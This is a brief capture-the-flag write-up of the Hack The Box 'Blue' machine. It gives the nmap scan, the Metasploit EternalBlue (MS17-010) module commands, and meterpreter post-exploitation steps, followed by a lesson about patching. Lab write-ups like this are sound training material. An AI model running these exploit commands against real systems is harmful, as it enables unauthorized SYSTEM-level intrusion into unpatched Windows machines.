#Hack The Box: "Blue" Challenge Writeup
#Objective:

The objective was to exploit a Windows machine vulnerable to the EternalBlue (MS17-010) exploit.
#Step 1: Scanning for Open Ports

-Used nmap to scan the target machine:

    'bash
    'nmap -A -T4 <target_ip>

Discovered port 445 (SMB) was open.

#Step 2: Exploiting EternalBlue (MS17-010)

The open SMB port suggested the machine was vulnerable to EternalBlue, a well-known exploit for Windows.
    Used Metasploit to exploit the vulnerability:

    'bash
    'msfconsole
    'use exploit/windows/smb/ms17_010_eternalblue
    'set RHOST <target_ip>
    'exploit

        Successfully gained SYSTEM access on the target machine.

#Step 3: Post-Exploitation

After gaining access, listed users and explored the system for flags using meterpreter.

    'bash
    'meterpreter > sysinfo
    'meterpreter > shell

#Lessons Learned:

    -EternalBlue is still a common vulnerability on unpatched Windows systems.
    -It's important to ensure critical systems are patched to prevent exploitation by well-known vulnerabilities.
